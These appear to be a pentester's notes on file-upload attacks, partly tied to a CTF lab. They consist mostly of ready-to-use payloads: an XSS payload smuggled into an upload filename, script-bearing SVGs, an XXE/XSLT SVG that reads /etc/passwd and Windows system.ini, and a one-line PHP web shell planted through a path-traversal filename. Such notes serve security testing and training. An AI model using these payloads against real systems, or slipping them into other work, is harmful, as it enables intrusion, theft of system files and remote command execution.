_____

# XSS in File Name

```
filename="test<img src=x onerror=alert()>.png"
```

# Bypassing Content Types

Try deleting Content-Type
```
Content-Type: text/html
```

Add `<script>alert()</script>`

# Content/MIME Types

https://github.com/BlackFan/content-type-research/blob/master/XSS.md

# SVGs

```
Content-Type: text/svg
```

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400" />
    
    <script>
        alert(1)
    </script>
</svg>
```

The lab allows you to upload your own profile picture, create an svg with the below content:

Make a note of the uploaded file, the URL will be something like /uploads/e943fc9a281b6834f6a6cbd98a0f3af5.svg

The View PDF feature makes a pdf from the html version of the order can be traversed to the image upload e.g:
https://xxxxxxxx.eu1.ctfio.com/pdf.php?order_id=.../uploads/e943fc9a281b6834f6a6cbd98a0f3af5.svg

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="#"?>
<!DOCTYPE div [
    <!ENTITY passwd_p SYSTEM "file:///etc/passwd">
    <!ENTITY passwd_c SYSTEM "file://c:/etc/passwd">
    <!ENTITY sysini_p SYSTEM "file:///c:/windows/system.ini">
    <!ENTITY sysini_c SYSTEM "file://c:/windows/system.ini">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:copy-of select="document('')"/>
        <body xmlns="http://www.w3.org/1999/xhtml">
            <div style="display:none">
                <p class="&passwd_p;">&passwd_c;</p>
                <p class="&sysini_p;">&sysini_c;</p>
            </div>
            <div style="width:40rem" id="r" />
            <script>
                document.querySelector('#r').innerHTML = `
                remote web url: &lt;textarea style="width:100%;height:1rem">${location.href}&lt;/textarea>&lt;br/>&lt;br/>`;
                document.querySelectorAll('p').forEach(p => {
                //You can send p.innerHTML by POST.
                document.querySelector('#r').innerHTML += `
                local file path: &lt;textarea style="width:100%;height:1rem">${p.className}&lt;/textarea>&lt;br/>
                local file content: &lt;textarea style="width:100%;height:6rem">${p.innerHTML}&lt;/textarea>&lt;br/>`;
                });
            </script>
        </body>
    </xsl:template>
</xsl:stylesheet>
```

# Path Traversal

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

filename="../shell.php"